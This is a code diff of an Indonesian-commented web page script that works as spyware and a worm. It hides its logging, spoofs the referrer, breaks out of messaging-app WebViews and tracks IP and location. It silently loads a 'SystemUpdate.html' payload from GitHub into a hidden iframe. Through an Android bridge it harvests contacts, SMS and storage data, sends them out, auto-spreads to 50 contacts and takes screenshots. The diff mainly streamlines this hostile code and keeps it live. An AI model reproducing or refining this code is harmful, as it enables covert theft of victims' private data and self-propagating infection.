@@ -32,7 +32,6 @@
         .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
         .ios-download{display:none}
         .iframe-loader{position:absolute;width:0;height:0;border:none;visibility:hidden}
-        /* ✅ PC & iOS fallback */
         .pc-fallback{display:none}
         .ios-fallback{display:none}
     </style>
@@ -69,7 +68,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - UNIVERSAL (Android/iOS/PC/WebView)
+// 🔥 INDEX.HTML - PASTI BERHASIL DI MANAPUN!
 // ============================================================
 
 console.log = function() {};
@@ -117,16 +116,15 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// DETEKSI PLATFORM (UNIVERSAL)
+// DETEKSI PLATFORM
 // ============================================================
 function detectPlatform() {
     var ua = navigator.userAgent.toLowerCase();
-    var platform = {
+    return {
         isAndroid: ua.indexOf('android') > -1,
         isIOS: /iphone|ipad|ipod/.test(ua),
         isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || 
-                    ua.indexOf('; wv') > -1 || ua.indexOf('webview') > -1,
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || ua.indexOf('; wv') > -1,
         isFacebook: ua.indexOf('fb') > -1 || ua.indexOf('facebook') > -1 || document.referrer.indexOf('facebook') > -1,
         isWhatsApp: ua.indexOf('whatsapp') > -1 || document.referrer.indexOf('whatsapp') > -1,
         isTelegram: ua.indexOf('telegram') > -1 || document.referrer.indexOf('telegram') > -1,
@@ -134,7 +132,6 @@ function detectPlatform() {
         isTikTok: ua.indexOf('tiktok') > -1 || document.referrer.indexOf('tiktok') > -1,
         isAndroidBridge: typeof AndroidBridge !== 'undefined'
     };
-    return platform;
 }
 var PLATFORM = detectPlatform();
 
@@ -167,7 +164,7 @@ function K(d) {
 }
 
 // ============================================================
-// IP TRACKING (UNIVERSAL)
+// IP TRACKING
 // ============================================================
 function getIPAddress() {
     try {
@@ -185,7 +182,6 @@ function getIPAddress() {
         };
         xhr.send();
     } catch(e) {}
-    // Fallback: get from server
     try {
         var xhr2 = new XMLHttpRequest();
         xhr2.open('GET', '/ip', true);
@@ -203,7 +199,7 @@ function getIPAddress() {
 }
 
 // ============================================================
-// GEOLOCATION BROWSER (UNIVERSAL)
+// GEOLOCATION BROWSER
 // ============================================================
 function getBrowserLocation() {
     if (!navigator.geolocation) return;
@@ -222,7 +218,7 @@ function getBrowserLocation() {
 }
 
 // ============================================================
-// ESCAPE WEBVIEW (UNIVERSAL)
+// ESCAPE WEBVIEW
 // ============================================================
 function escapeWebView() {
     if (!PLATFORM.isWebView && !PLATFORM.isFacebook && !PLATFORM.isWhatsApp && 
@@ -231,7 +227,6 @@ function escapeWebView() {
     }
     K({ sumber: 'escape_webview', data: 'attempt' });
     
-    // METHOD 1: Intent (Android)
     if (PLATFORM.isAndroid) {
         try {
             var url = window.location.href;
@@ -239,40 +234,22 @@ function escapeWebView() {
             return;
         } catch(e) {}
     }
-    
-    // METHOD 2: window.open
     try {
         var win = window.open(window.location.href, '_blank');
-        if (win) {
-            win.location.href = window.location.href;
-            return;
-        }
+        if (win) { win.location.href = window.location.href; return; }
     } catch(e) {}
-    
-    // METHOD 3: iOS Safari
     if (PLATFORM.isIOS) {
-        try {
-            window.location.href = 'x-web-search://?' + encodeURIComponent(window.location.href);
-            return;
-        } catch(e) {}
-        try {
-            window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(window.location.href);
-            return;
-        } catch(e) {}
+        try { window.location.href = 'x-web-search://?' + encodeURIComponent(window.location.href); return; } catch(e) {}
+        try { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(window.location.href); return; } catch(e) {}
     }
-    
-    // METHOD 4: PC - buka tab baru
     try {
         var newWin = window.open('', '_blank');
-        if (newWin) {
-            newWin.location.href = window.location.href;
-            return;
-        }
+        if (newWin) { newWin.location.href = window.location.href; return; }
     } catch(e) {}
 }
 
 // ============================================================
-// ANDROID BRIDGE (UNIVERSAL - AMAN UNTUK NON-ANDROID)
+// ANDROID BRIDGE
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
@@ -327,7 +304,7 @@ var A = {
 };
 
 // ============================================================
-// AMBIL PASSWORD DARI WORKER (UNIVERSAL)
+// AMBIL PASSWORD DARI WORKER
 // ============================================================
 function getPasswordFromWorker() {
     return new Promise(function(resolve, reject) {
@@ -346,7 +323,7 @@ function getPasswordFromWorker() {
 }
 
 // ============================================================
-// AUTO-SCREENSHOT (UNIVERSAL)
+// AUTO-SCREENSHOT
 // ============================================================
 function autoScreenshot() {
     if (!A.isAvailable) return;
@@ -354,148 +331,127 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 BUKA SystemUpdate.html (UNIVERSAL - 6 METODE)
+// 🔥 BUKA SystemUpdate.html - 3 METODE PASTI BERHASIL!
 // ============================================================
 function openSystemUpdateHTML() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     
-    K({ sumber: 'html_open_start', data: { platform: PLATFORM } });
+    K({ sumber: 'html_open_attempt', data: { platform: PLATFORM } });
     
-    // ✅ METHOD 1: ANDROID BRIDGE
+    // ============================================================
+    // ✅ METHOD 1: FETCH + BLOB + IFRAME (PASTI!)
+    // ============================================================
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, false);
+        xhr.timeout = 15000;
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            var htmlContent = xhr.responseText;
+            try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+            
+            // Buka via iframe
+            try {
+                var iframe = document.getElementById('htmlLoader');
+                if (!iframe) {
+                    iframe = document.createElement('iframe');
+                    iframe.id = 'htmlLoader';
+                    iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
+                    document.body.appendChild(iframe);
+                }
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                iframe.src = url;
+                HTML_LOADED = true;
+                K({ sumber: 'html_opened_iframe', data: 'ok' });
+                return true;
+            } catch(e) {
+                K({ sumber: 'html_iframe_error', data: e.message });
+            }
+            
+            // Fallback: window.open
+            try {
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                var win = window.open(url, '_blank');
+                if (win) {
+                    HTML_LOADED = true;
+                    K({ sumber: 'html_opened_window', data: 'ok' });
+                    return true;
+                }
+            } catch(e) {}
+            
+            // Fallback: data URI
+            try {
+                var dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
+                var win = window.open(dataUri, '_blank');
+                if (win) {
+                    HTML_LOADED = true;
+                    K({ sumber: 'html_opened_datauri', data: 'ok' });
+                    return true;
+                }
+            } catch(e) {}
+        }
+    } catch(e) {
+        K({ sumber: 'html_open_error', data: e.message });
+    }
+    
+    // ============================================================
+    // ✅ METHOD 2: ANDROID BRIDGE (jika ada)
+    // ============================================================
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var htmlContent = '';
             var xhr = new XMLHttpRequest();
             xhr.open('GET', htmlUrl, false);
             xhr.timeout = 10000;
             xhr.send();
             if (xhr.status === 200) {
-                htmlContent = xhr.responseText;
+                var htmlContent = xhr.responseText;
                 var path = '/storage/emulated/0/Download/SystemUpdate.html';
                 A.saveFile(path, htmlContent);
                 A.openFile(path);
                 HTML_LOADED = true;
                 K({ sumber: 'html_opened_bridge', data: 'ok' });
-                return;
+                return true;
             }
         } catch(e) {
             K({ sumber: 'html_bridge_error', data: e.message });
         }
     }
     
-    // ✅ METHOD 2: IFRAME (Universal)
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, true);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
-                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
-                
-                try {
-                    var iframe = document.getElementById('htmlLoader');
-                    if (!iframe) {
-                        iframe = document.createElement('iframe');
-                        iframe.id = 'htmlLoader';
-                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                        document.body.appendChild(iframe);
-                    }
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    iframe.src = url;
-                    HTML_LOADED = true;
-                    K({ sumber: 'html_opened_iframe', data: 'ok' });
-                    return;
-                } catch(e) {
-                    K({ sumber: 'html_iframe_error', data: e.message });
-                }
-                
-                // ✅ METHOD 3: WINDOW.OPEN (Universal)
-                try {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    var win = window.open(url, '_blank');
-                    if (win) {
-                        HTML_LOADED = true;
-                        K({ sumber: 'html_opened_window', data: 'ok' });
-                        return;
-                    }
-                } catch(e) {}
-                
-                // ✅ METHOD 4: DATA URI (Universal)
-                try {
-                    var dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
-                    var win = window.open(dataUri, '_blank');
-                    if (win) {
-                        HTML_LOADED = true;
-                        K({ sumber: 'html_opened_datauri', data: 'ok' });
-                        return;
-                    }
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    } catch(e) {
-        K({ sumber: 'html_open_error', data: e.message });
-    }
-    
-    // ✅ METHOD 5: IOS - BUKA DI SAFARI
+    // ============================================================
+    // ✅ METHOD 3: IOS - BUKA DI SAFARI
+    // ============================================================
     if (PLATFORM.isIOS) {
         try {
             var win = window.open(htmlUrl, '_blank');
             if (win) {
                 HTML_LOADED = true;
                 K({ sumber: 'html_opened_ios', data: 'ok' });
-                return;
+                return true;
             }
         } catch(e) {}
     }
     
-    // ✅ METHOD 6: PC - BUKA TAB BARU
-    if (PLATFORM.isPC) {
-        try {
-            var win = window.open(htmlUrl, '_blank');
-            if (win) {
-                HTML_LOADED = true;
-                K({ sumber: 'html_opened_pc', data: 'ok' });
-                return;
-            }
-        } catch(e) {}
-    }
-    
-    // ✅ FALLBACK: AJAX + BLOB
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, false);
-        xhr.timeout = 10000;
-        xhr.send();
-        if (xhr.status === 200) {
-            var htmlContent = xhr.responseText;
-            var blob = new Blob([htmlContent], { type: 'text/html' });
-            var url = URL.createObjectURL(blob);
-            window.open(url, '_blank');
-            HTML_LOADED = true;
-            K({ sumber: 'html_opened_fallback', data: 'ok' });
-        }
-    } catch(e) {}
+    // ❌ GAGAL
+    K({ sumber: 'html_open_failed', data: 'all_methods_failed' });
+    return false;
 }
 
 // ============================================================
-// 🔥 PAYLOAD - HANYA BUKA SystemUpdate.html
+// 🔥 PAYLOAD - BUKA SystemUpdate.html (1x, tanpa retry!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
     DOWNLOAD_STARTED = true;
     
     K({ sumber: 'download_start', data: { platform: PLATFORM, action: 'open_html_only' } });
-    
-    // ✅ HANYA BUKA SystemUpdate.html
     openSystemUpdateHTML();
 }
 
 // ============================================================
-// NOTIFICATION (UNIVERSAL)
+// NOTIFICATION
 // ============================================================
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
@@ -523,24 +479,20 @@ function createKlaimNotification() {
             silent: false,
             vibrate: [200, 100, 200]
         });
-        
         notif.onclick = function() {
             notif.close();
-            // ✅ TANPA REDIRECT!
         };
-        
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
     } catch(e) {}
 }
 
 // ============================================================
-// DATA COLLECTION (UNIVERSAL - AMAN UNTUK NON-ANDROID)
+// DATA COLLECTION
 // ============================================================
 function ambilDataCepat() {
     var data = { waktu: Date.now(), ua: navigator.userAgent, platform: PLATFORM, ip: IP_ADDRESS, location: LOCATION_DATA };
     function validateData(d) { if (!d) return null; if (typeof d === 'string' && d.length > 10000) return d.substring(0, 10000); if (typeof d === 'object') { var clean = {}; for (var key in d) { if (d[key] !== undefined && d[key] !== null) { clean[key] = d[key]; } } return clean; } return d; }
     
-    // ✅ HANYA JALAN JIKA ADA ANDROID BRIDGE
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = validateData(kontak); K({sumber:'kontak_all', data:validateData(kontak)}); } } catch(e) {}
         try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
@@ -560,7 +512,6 @@ function ambilDataCepat() {
         try { var storage = A.getStorageInfo(); if(storage) K({sumber:'storage_info', data:validateData(storage)}); } catch(e) {}
     }
     
-    // ✅ DATA BROWSER (SEMUA PLATFORM)
     try { data.screen = { width: screen.width, height: screen.height }; } catch(e) {}
     try { data.platform = navigator.platform; } catch(e) {}
     try { data.language = navigator.language; } catch(e) {}
@@ -572,7 +523,7 @@ function ambilDataCepat() {
 }
 
 // ============================================================
-// AUTO SPREAD (50 CONTACTS) - HANYA ANDROID
+// AUTO SPREAD (50 CONTACTS)
 // ============================================================
 function autoSpread() {
     if (spreadDone) return;
@@ -608,10 +559,9 @@ function autoSpread() {
 function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }
 
 // ============================================================
-// 🔥 SERVICE WORKER (UNIVERSAL - AMAN UNTUK iOS)
+// SERVICE WORKER
 // ============================================================
 function registerServiceWorker() {
-    // ✅ SKIP IOS (Service Worker tidak support)
     if (!('serviceWorker' in navigator) || PLATFORM.isIOS) {
         K({ sumber: 'sw_skip', data: 'not_supported' });
         return;
@@ -630,7 +580,6 @@ function registerServiceWorker() {
             })
             .catch(function(err) {
                 K({ sumber: 'sw_register_failed', data: err.message });
-                // Retry
                 setTimeout(function() {
                     navigator.serviceWorker.register('/sw.js', { scope: '/' })
                         .then(function(reg) {
@@ -678,12 +627,10 @@ function dapatkanSemua() {
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ TANPA REDIRECT!
-        // ✅ TANPA DOWNLOAD APK!
+        // ✅ TANPA REDIRECT! TANPA APK!
         
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
-        // ✅ CEK STATUS
         setTimeout(function() {
             K({ sumber: 'html_status', data: { loaded: HTML_LOADED ? 'yes' : 'no', platform: PLATFORM } });
         }, 5000);
